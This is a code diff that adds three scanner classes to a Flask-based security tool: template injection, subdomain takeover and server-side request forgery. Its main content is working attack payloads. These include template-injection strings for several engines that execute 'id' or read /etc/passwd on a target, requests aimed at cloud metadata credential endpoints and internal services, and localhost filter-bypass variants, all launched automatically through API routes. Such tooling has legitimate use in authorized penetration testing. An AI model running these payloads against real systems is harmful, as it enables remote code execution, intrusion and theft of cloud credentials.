@@ -21527,6 +21527,661 @@ def cors_test_route():
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
+# ─────────────────────────────────────────────────────────
+#  SSTI SCANNER
+# ─────────────────────────────────────────────────────────
+class SSTIScanner:
+    """
+    Detect Server-Side Template Injection across all major template engines
+    and attempt RCE confirmation. Optionally calls tplmap for deep analysis.
+    """
+
+    # (payload, expected_substring, possible_engines)
+    DETECT_PROBES = [
+        ("{{7*7}}",    "49",      ["Jinja2", "Twig", "Nunjucks", "Pebble", "Tornado"]),
+        ("${7*7}",     "49",      ["Freemarker", "Mako", "Spring-EL", "Thymeleaf"]),
+        ("#{7*7}",     "49",      ["Pug", "Groovy"]),
+        ("<%= 7*7 %>", "49",      ["ERB", "EJS"]),
+        ("{7*7}",      "49",      ["Smarty"]),
+        ("{{7*'7'}}",  "7777777", ["Jinja2"]),
+        ("${{7*7}}",   "49",      ["Freemarker-alt"]),
+        ("@(7*7)",     "49",      ["Razor", "Play"]),
+    ]
+
+    # RCE confirmation payloads per engine — look for uid=/root:/www-data in response
+    RCE_PROBES: Dict[str, List[str]] = {
+        "Jinja2": [
+            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+        ],
+        "Twig": [
+            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
+        ],
+        "Freemarker": [
+            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
+        ],
+        "Mako": [
+            "${__import__('os').popen('id').read()}",
+        ],
+        "ERB": [
+            "<%= `id` %>",
+        ],
+        "Smarty": [
+            "{php}echo `id`;{/php}",
+            "{if system('id')}{/if}",
+        ],
+    }
+
+    _RCE_INDICATORS = ["uid=", "root:", "www-data", "daemon", "nobody"]
+
+    def _discover_params(self, target: str, depth: int) -> List[Dict]:
+        from urllib.parse import urlparse, parse_qs
+        params: List[Dict] = []
+        try:
+            res = subprocess.run(
+                ["katana", "-u", target, "-d", str(depth), "-jc", "-silent"],
+                capture_output=True, text=True, timeout=120,
+            )
+            for line in res.stdout.splitlines():
+                line = line.strip()
+                if "?" not in line:
+                    continue
+                parsed = urlparse(line)
+                for param in parse_qs(parsed.query):
+                    params.append({"url": line, "param": param})
+        except FileNotFoundError:
+            logger.warning("SSTIScanner: katana not found — using target only")
+        # Always include a direct probe on the target itself
+        params.append({"url": target + ("&" if "?" in target else "?") + "q=test", "param": "q"})
+        return params
+
+    def _inject(self, url: str, param: str, payload: str) -> Optional[str]:
+        from urllib.parse import urlparse, parse_qs, urlencode
+        try:
+            parsed = urlparse(url)
+            qs = parse_qs(parsed.query)
+            qs[param] = [payload]
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(qs, doseq=True)}"
+            r = requests.get(test_url, timeout=8, verify=False,
+                             headers={"User-Agent": "Mozilla/5.0"})
+            return r.text
+        except Exception:
+            return None
+
+    def _run_tplmap(self, target: str) -> List[Dict]:
+        findings: List[Dict] = []
+        search_paths = [
+            "tplmap",
+            os.path.expanduser("~/tools/tplmap/tplmap.py"),
+            "/opt/tplmap/tplmap.py",
+            "/usr/local/bin/tplmap",
+        ]
+        for tp in search_paths:
+            try:
+                cmd = (["python3", tp, "-u", f"{target}*"]
+                       if tp.endswith(".py") else
+                       ["tplmap", "-u", f"{target}*"])
+                res = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+                out = res.stdout + res.stderr
+                if "injection" in out.lower() or "vulnerable" in out.lower():
+                    em = re.search(
+                        r"(Jinja2|Twig|Freemarker|Mako|ERB|Smarty|Velocity|Pebble|Tornado)",
+                        out, re.I,
+                    )
+                    findings.append({
+                        "url":      target,
+                        "param":    "*",
+                        "tool":     "tplmap",
+                        "engine":   em.group(1) if em else "Unknown",
+                        "severity": "CRITICAL",
+                        "raw":      out[:400],
+                    })
+                break
+            except FileNotFoundError:
+                continue
+            except Exception as e:
+                logger.debug(f"tplmap error: {e}")
+                break
+        return findings
+
+    def run(
+        self,
+        target: str,
+        depth: int = 3,
+        use_tplmap: bool = True,
+        try_rce: bool = True,
+    ) -> Dict:
+        _start = time.time()
+        all_findings: List[Dict] = []
+        rce_findings: List[Dict] = []
+
+        params = self._discover_params(target, depth)
+        logger.info(f"SSTIScanner: {len(params)} param/URL combos on {target}")
+
+        # Stage 1: detection probes
+        vulnerable: List[Dict] = []
+        for p in params[:50]:
+            for payload, expected, engines in self.DETECT_PROBES:
+                body = self._inject(p["url"], p["param"], payload)
+                if body and expected in body:
+                    finding = {
+                        "url":      p["url"],
+                        "param":    p["param"],
+                        "payload":  payload,
+                        "expected": expected,
+                        "engines":  engines,
+                        "severity": "HIGH",
+                        "tool":     "manual_probe",
+                    }
+                    all_findings.append(finding)
+                    vulnerable.append(p)
+                    break
+
+        # Stage 2: optional tplmap
+        if use_tplmap:
+            all_findings.extend(self._run_tplmap(target))
+
+        # Stage 3: RCE confirmation
+        if try_rce and vulnerable:
+            for p in vulnerable[:5]:
+                detected = []
+                for f in all_findings:
+                    if f.get("url") == p["url"] and f.get("param") == p["param"]:
+                        detected.extend(f.get("engines", []))
+                for engine, payloads in self.RCE_PROBES.items():
+                    if any(engine.lower() in e.lower() for e in detected) or not detected:
+                        for rce_pl in payloads:
+                            body = self._inject(p["url"], p["param"], rce_pl)
+                            if body and any(ind in body for ind in self._RCE_INDICATORS):
+                                rce_findings.append({
+                                    "url":      p["url"],
+                                    "param":    p["param"],
+                                    "engine":   engine,
+                                    "payload":  rce_pl[:120],
+                                    "evidence": "RCE confirmed — system command output in response",
+                                    "severity": "CRITICAL",
+                                })
+                                break
+
+        # Deduplicate
+        seen: set = set()
+        unique: List[Dict] = []
+        for f in all_findings:
+            key = (f.get("url"), f.get("param"), f.get("payload", "")[:30])
+            if key not in seen:
+                seen.add(key)
+                unique.append(f)
+
+        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
+        unique.sort(key=lambda x: sev_order.get(x.get("severity", "LOW"), 99))
+        rce_findings.sort(key=lambda x: sev_order.get(x.get("severity", "LOW"), 99))
+
+        return {
+            "target":         target,
+            "params_tested":  len(params),
+            "total_findings": len(unique),
+            "high":           sum(1 for f in unique if f.get("severity") == "HIGH"),
+            "rce_confirmed":  len(rce_findings),
+            "critical":       len(rce_findings),
+            "findings":       unique,
+            "rce_findings":   rce_findings,
+            "duration_sec":   round(time.time() - _start, 2),
+        }
+
+
+ssti_scanner = SSTIScanner()
+
+
+@app.route("/api/tools/ssti/scan", methods=["POST"])
+def ssti_scan_route():
+    try:
+        params = request.json or {}
+        result = ssti_scanner.run(
+            target=params.get("target", ""),
+            depth=int(params.get("depth", 3)),
+            use_tplmap=bool(params.get("use_tplmap", True)),
+            try_rce=bool(params.get("try_rce", True)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 ssti/scan error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ─────────────────────────────────────────────────────────
+#  SUBDOMAIN TAKEOVER SCANNER
+# ─────────────────────────────────────────────────────────
+class SubdomainTakeoverScanner:
+    """
+    Enumerate subdomains, resolve CNAMEs, and identify takeover opportunities
+    via fingerprint matching, subzy, and nuclei takeover templates.
+    """
+
+    # service_pattern → {error_string, service_name, severity}
+    FINGERPRINTS: Dict[str, Dict] = {
+        "github.io":         {"error": "There isn't a GitHub Pages site here",           "service": "GitHub Pages",    "sev": "HIGH"},
+        "herokuapp.com":     {"error": "No such app",                                    "service": "Heroku",          "sev": "HIGH"},
+        "netlify.app":       {"error": "Not Found - Request ID",                         "service": "Netlify",         "sev": "MEDIUM"},
+        "s3.amazonaws.com":  {"error": "NoSuchBucket",                                   "service": "AWS S3",          "sev": "CRITICAL"},
+        "azurewebsites.net": {"error": "The web app you have attempted to reach",        "service": "Azure Web Apps",  "sev": "HIGH"},
+        "cloudapp.net":      {"error": "404 - Web app not found",                        "service": "Azure CloudApp",  "sev": "HIGH"},
+        "shopify.com":       {"error": "Sorry, this shop is currently unavailable",      "service": "Shopify",         "sev": "MEDIUM"},
+        "myshopify.com":     {"error": "Sorry, this shop is currently unavailable",      "service": "Shopify",         "sev": "MEDIUM"},
+        "bitbucket.io":      {"error": "Repository not found",                           "service": "Bitbucket",       "sev": "MEDIUM"},
+        "ghost.io":          {"error": "The thing you were looking for is no longer here","service": "Ghost",          "sev": "MEDIUM"},
+        "surge.sh":          {"error": "project not found",                              "service": "Surge",           "sev": "MEDIUM"},
+        "fastly.com":        {"error": "Fastly error: unknown domain",                   "service": "Fastly CDN",      "sev": "HIGH"},
+        "zendesk.com":       {"error": "Help Center Closed",                             "service": "Zendesk",         "sev": "MEDIUM"},
+        "firebaseapp.com":   {"error": "Firebase App Not Found",                         "service": "Firebase",        "sev": "HIGH"},
+        "web.app":           {"error": "Firebase App Not Found",                         "service": "Firebase",        "sev": "HIGH"},
+        "tumblr.com":        {"error": "There's nothing here.",                          "service": "Tumblr",          "sev": "MEDIUM"},
+        "squarespace.com":   {"error": "No Such Account",                                "service": "Squarespace",     "sev": "MEDIUM"},
+        "pantheonsite.io":   {"error": "404 error unknown site",                         "service": "Pantheon",        "sev": "MEDIUM"},
+        "readme.io":         {"error": "Project doesnt exist",                           "service": "Readme.io",       "sev": "MEDIUM"},
+        "wpengine.com":      {"error": "The site you were looking for couldn't be found","service": "WP Engine",       "sev": "MEDIUM"},
+    }
+
+    def _get_cname(self, subdomain: str) -> Optional[str]:
+        try:
+            res = subprocess.run(
+                ["dig", "+short", "CNAME", subdomain],
+                capture_output=True, text=True, timeout=5,
+            )
+            cname = res.stdout.strip().rstrip(".")
+            return cname if cname else None
+        except Exception:
+            return None
+
+    def _check_fingerprint(self, subdomain: str, cname: str) -> Optional[Dict]:
+        for pattern, data in self.FINGERPRINTS.items():
+            if pattern in cname:
+                try:
+                    r = requests.get(f"https://{subdomain}", timeout=8, verify=False,
+                                     headers={"User-Agent": "Mozilla/5.0"})
+                    confirmed = data["error"].lower() in r.text.lower()
+                    return {
+                        "subdomain": subdomain,
+                        "cname":     cname,
+                        "service":   data["service"],
+                        "severity":  data["sev"] if confirmed else "MEDIUM",
+                        "confirmed": confirmed,
+                        "evidence":  (f"Error string '{data['error']}' found in response"
+                                      if confirmed else
+                                      f"CNAME → {data['service']} returns {r.status_code}"),
+                    }
+                except requests.exceptions.ConnectionError:
+                    # NXDOMAIN or unreachable — strong takeover signal
+                    return {
+                        "subdomain": subdomain,
+                        "cname":     cname,
+                        "service":   data["service"],
+                        "severity":  "CRITICAL",
+                        "confirmed": True,
+                        "evidence":  "Connection failed — CNAME target unreachable/unclaimed",
+                    }
+                except Exception:
+                    pass
+        return None
+
+    def _enumerate(self, domain: str) -> List[str]:
+        subs: set = set()
+        try:
+            res = subprocess.run(
+                ["subfinder", "-d", domain, "-silent"],
+                capture_output=True, text=True, timeout=180,
+            )
+            for line in res.stdout.splitlines():
+                line = line.strip()
+                if line:
+                    subs.add(line)
+            logger.info(f"SubdomainTakeover: subfinder → {len(subs)} subdomains")
+        except FileNotFoundError:
+            logger.warning("SubdomainTakeover: subfinder not found")
+            subs.add(domain)
+        return list(subs)
+
+    def _run_subzy(self, subdomains: List[str]) -> List[Dict]:
+        findings: List[Dict] = []
+        tf_path: Optional[str] = None
+        try:
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
+                for s in subdomains:
+                    tf.write(s + "\n")
+                tf_path = tf.name
+            res = subprocess.run(
+                ["subzy", "run", "--targets", tf_path, "--hide-fails", "--timeout", "10"],
+                capture_output=True, text=True, timeout=300,
+            )
+            for line in res.stdout.splitlines():
+                line = line.strip()
+                if "VULNERABLE" in line.upper():
+                    sub_m = re.search(r"([\w\-\.]+\.[a-z]{2,})", line)
+                    svc_m = re.search(r"-\s*([A-Za-z][\w\s\-\.]+)$", line)
+                    findings.append({
+                        "subdomain": sub_m.group(1) if sub_m else "",
+                        "service":   svc_m.group(1).strip() if svc_m else "Unknown",
+                        "severity":  "HIGH",
+                        "confirmed": True,
+                        "tool":      "subzy",
+                        "evidence":  line[:200],
+                    })
+        except FileNotFoundError:
+            logger.debug("subzy not installed — skipping")
+        except Exception as e:
+            logger.warning(f"subzy error: {e}")
+        finally:
+            if tf_path:
+                try:
+                    os.unlink(tf_path)
+                except Exception:
+                    pass
+        return findings
+
+    def _run_nuclei_takeover(self, subdomains: List[str]) -> List[Dict]:
+        findings: List[Dict] = []
+        tf_path: Optional[str] = None
+        try:
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
+                for s in subdomains:
+                    tf.write(s + "\n")
+                tf_path = tf.name
+            res = subprocess.run(
+                ["nuclei", "-l", tf_path, "-t", "takeovers/", "-json", "-silent"],
+                capture_output=True, text=True, timeout=300,
+            )
+            for line in res.stdout.splitlines():
+                try:
+                    data = json.loads(line)
+                    findings.append({
+                        "subdomain": data.get("host", ""),
+                        "service":   data.get("info", {}).get("name", "Unknown"),
+                        "severity":  data.get("info", {}).get("severity", "medium").upper(),
+                        "confirmed": True,
+                        "tool":      "nuclei",
+                        "evidence":  str(data.get("matched-at", ""))[:200],
+                    })
+                except Exception:
+                    pass
+        except FileNotFoundError:
+            logger.debug("nuclei not installed — skipping")
+        finally:
+            if tf_path:
+                try:
+                    os.unlink(tf_path)
+                except Exception:
+                    pass
+        return findings
+
+    def run(
+        self,
+        domain: str,
+        use_subfinder: bool = True,
+        use_subzy: bool = True,
+        use_nuclei: bool = True,
+        manual_check: bool = True,
+    ) -> Dict:
+        _start    = time.time()
+        subdomains = self._enumerate(domain) if use_subfinder else [domain]
+
+        all_findings: List[Dict] = []
+
+        if use_subzy and subdomains:
+            all_findings.extend(self._run_subzy(subdomains))
+
+        if use_nuclei and subdomains:
+            all_findings.extend(self._run_nuclei_takeover(subdomains))
+
+        if manual_check and subdomains:
+            for sub in subdomains[:100]:
+                cname = self._get_cname(sub)
+                if cname:
+                    finding = self._check_fingerprint(sub, cname)
+                    if finding:
+                        all_findings.append(finding)
+
+        # Deduplicate by subdomain + service
+        seen: set = set()
+        unique: List[Dict] = []
+        for f in all_findings:
+            key = (f.get("subdomain", ""), f.get("service", ""))
+            if key not in seen:
+                seen.add(key)
+                unique.append(f)
+
+        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
+        unique.sort(key=lambda x: sev_order.get(x.get("severity", "LOW"), 99))
+
+        return {
+            "domain":             domain,
+            "subdomains_found":   len(subdomains),
+            "total_findings":     len(unique),
+            "critical":           sum(1 for f in unique if f.get("severity") == "CRITICAL"),
+            "high":               sum(1 for f in unique if f.get("severity") == "HIGH"),
+            "medium":             sum(1 for f in unique if f.get("severity") == "MEDIUM"),
+            "confirmed_takeovers":sum(1 for f in unique if f.get("confirmed")),
+            "findings":           unique,
+            "subdomains":         subdomains[:50],
+            "duration_sec":       round(time.time() - _start, 2),
+        }
+
+
+subdomain_takeover = SubdomainTakeoverScanner()
+
+
+@app.route("/api/tools/takeover/scan", methods=["POST"])
+def takeover_scan_route():
+    try:
+        params = request.json or {}
+        result = subdomain_takeover.run(
+            domain=params.get("domain", ""),
+            use_subfinder=bool(params.get("use_subfinder", True)),
+            use_subzy=bool(params.get("use_subzy", True)),
+            use_nuclei=bool(params.get("use_nuclei", True)),
+            manual_check=bool(params.get("manual_check", True)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 takeover/scan error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ─────────────────────────────────────────────────────────
+#  SSRF SCANNER
+# ─────────────────────────────────────────────────────────
+class SSRFScanner:
+    """
+    Detect Server-Side Request Forgery via direct internal probing and
+    blind out-of-band callback detection. Tests cloud metadata endpoints,
+    internal services, and common URL parameter patterns.
+    """
+
+    # (url, service_label, response_indicators)
+    INTERNAL_TARGETS = [
+        ("http://169.254.169.254/latest/meta-data/",     "AWS metadata",       ["ami-id", "instance-id", "local-ipv4", "security-credentials"]),
+        ("http://169.254.169.254/computeMetadata/v1/",   "GCP metadata",       ["project-id", "numeric-project-id", "email"]),
+        ("http://169.254.169.254/metadata/instance",     "Azure metadata",     ["compute", "subscriptionId", "resourceGroupName"]),
+        ("http://169.254.169.254/latest/user-data",      "AWS user-data",      ["#!/", "cloud-init", "UserData", "#cloud-config"]),
+        ("http://127.0.0.1/server-status",               "Apache server-status",["Total Accesses", "CPU Usage", "Requests/sec"]),
+        ("http://127.0.0.1:6379/",                       "Redis",              ["redis_version", "+PONG", "-ERR", "-NOAUTH"]),
+        ("http://127.0.0.1:27017/",                      "MongoDB",            ["MongoDB", "mongod", "topology"]),
+        ("http://127.0.0.1:9200/",                       "Elasticsearch",      ["cluster_name", "tagline", "lucene_version"]),
+        ("http://127.0.0.1:2375/v1.24/info",             "Docker API",         ["DockerRootDir", "Containers", "NCPU"]),
+        ("http://kubernetes.default.svc/api/",           "Kubernetes API",     ["apiVersion", "kind", "paths"]),
+    ]
+
+    # Common filter bypass variants for 127.0.0.1
+    BYPASS_VARIANTS = [
+        "http://0177.0.0.1/",
+        "http://0x7f.0x0.0x0.0x1/",
+        "http://127.1/",
+        "http://[::1]/",
+        "http://127.0.0.1.nip.io/",
+        "http://localtest.me/",
+        "http://localhost.localdomain/",
+        "http://0.0.0.0/",
+    ]
+
+    # Parameter names commonly involved in SSRF
+    _SSRF_PARAMS = {
+        "url", "uri", "href", "link", "src", "dest", "destination",
+        "target", "redirect", "next", "to", "return", "return_url",
+        "redirect_url", "next_url", "path", "file", "proxy", "fetch",
+        "load", "open", "resource", "reference", "host", "website",
+        "page", "site", "endpoint", "api_url", "image", "img", "avatar",
+        "thumbnail", "photo", "webhook", "callback", "notify", "ping",
+        "feed", "rss", "xml", "remote", "document", "report", "source",
+    }
+
+    def _find_params(self, target: str, depth: int) -> List[Dict]:
+        from urllib.parse import urlparse, parse_qs
+        params: List[Dict] = []
+        try:
+            res = subprocess.run(
+                ["katana", "-u", target, "-d", str(depth), "-jc", "-silent"],
+                capture_output=True, text=True, timeout=120,
+            )
+            for line in res.stdout.splitlines():
+                line = line.strip()
+                if "?" not in line:
+                    continue
+                parsed = urlparse(line)
+                qs = parse_qs(parsed.query)
+                for pname, pvals in qs.items():
+                    val = pvals[0] if pvals else ""
+                    if pname.lower() in self._SSRF_PARAMS or val.startswith("http"):
+                        params.append({"url": line, "param": pname, "original": val})
+        except FileNotFoundError:
+            logger.warning("SSRFScanner: katana not found")
+
+        # Synthetic probes — inject common SSRF params at base URL
+        base = target.rstrip("/")
+        for pname in list(self._SSRF_PARAMS)[:8]:
+            params.append({
+                "url":      f"{base}?{pname}=http://test.example.com",
+                "param":    pname,
+                "original": "http://test.example.com",
+                "synthetic": True,
+            })
+        return params
+
+    def _probe_internal(self, url: str, param: str, internal_url: str) -> Optional[str]:
+        from urllib.parse import urlparse, parse_qs, urlencode
+        try:
+            parsed = urlparse(url)
+            qs = parse_qs(parsed.query)
+            qs[param] = [internal_url]
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(qs, doseq=True)}"
+            r = requests.get(test_url, timeout=8, verify=False,
+                             headers={"User-Agent": "Mozilla/5.0"})
+            return r.text
+        except Exception:
+            return None
+
+    def _inject_blind(self, url: str, param: str, callback_url: str) -> str:
+        import uuid
+        from urllib.parse import urlparse, parse_qs, urlencode
+        token    = uuid.uuid4().hex[:12]
+        cb       = f"{callback_url.rstrip('/')}/ssrf-probe-{token}"
+        try:
+            parsed = urlparse(url)
+            qs = parse_qs(parsed.query)
+            qs[param] = [cb]
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(qs, doseq=True)}"
+            requests.get(test_url, timeout=8, verify=False)
+        except Exception:
+            pass
+        return token
+
+    def run(
+        self,
+        target: str,
+        depth: int = 3,
+        callback_url: str = "",
+        test_internal: bool = True,
+        test_blind: bool = True,
+    ) -> Dict:
+        _start   = time.time()
+        all_findings: List[Dict] = []
+        blind_probes: List[Dict] = []
+
+        params = self._find_params(target, depth)
+        logger.info(f"SSRFScanner: {len(params)} candidate params on {target}")
+
+        if test_internal:
+            for p in params[:25]:
+                for int_url, svc_name, indicators in self.INTERNAL_TARGETS:
+                    body = self._probe_internal(p["url"], p["param"], int_url)
+                    if body:
+                        for ind in indicators:
+                            if ind.lower() in body.lower():
+                                all_findings.append({
+                                    "url":             p["url"],
+                                    "param":           p["param"],
+                                    "ssrf_target":     int_url,
+                                    "service":         svc_name,
+                                    "indicator":       ind,
+                                    "type":            "direct_ssrf",
+                                    "severity":        "CRITICAL",
+                                    "evidence":        f"'{ind}' in response when fetching {int_url}",
+                                    "response_snippet": body[:200],
+                                })
+                                break
+
+        if test_blind and callback_url:
+            for p in params[:20]:
+                token = self._inject_blind(p["url"], p["param"], callback_url)
+                blind_probes.append({
+                    "url":          p["url"],
+                    "param":        p["param"],
+                    "token":        token,
+                    "callback_url": f"{callback_url.rstrip('/')}/ssrf-probe-{token}",
+                    "note":         "Check your callback listener for an HTTP request with this token",
+                })
+
+        # Deduplicate
+        seen: set = set()
+        unique: List[Dict] = []
+        for f in all_findings:
+            key = (f.get("url"), f.get("param"), f.get("ssrf_target"))
+            if key not in seen:
+                seen.add(key)
+                unique.append(f)
+
+        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
+        unique.sort(key=lambda x: sev_order.get(x.get("severity", "LOW"), 99))
+
+        return {
+            "target":          target,
+            "params_tested":   len(params),
+            "total_findings":  len(unique),
+            "critical":        sum(1 for f in unique if f.get("severity") == "CRITICAL"),
+            "findings":        unique,
+            "blind_probes":    blind_probes,
+            "bypass_variants": self.BYPASS_VARIANTS,
+            "duration_sec":    round(time.time() - _start, 2),
+        }
+
+
+ssrf_scanner = SSRFScanner()
+
+
+@app.route("/api/tools/ssrf/scan", methods=["POST"])
+def ssrf_scan_route():
+    try:
+        params = request.json or {}
+        result = ssrf_scanner.run(
+            target=params.get("target", ""),
+            depth=int(params.get("depth", 3)),
+            callback_url=params.get("callback_url", ""),
+            test_internal=bool(params.get("test_internal", True)),
+            test_blind=bool(params.get("test_blind", True)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 ssrf/scan error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 # Create the banner after all classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
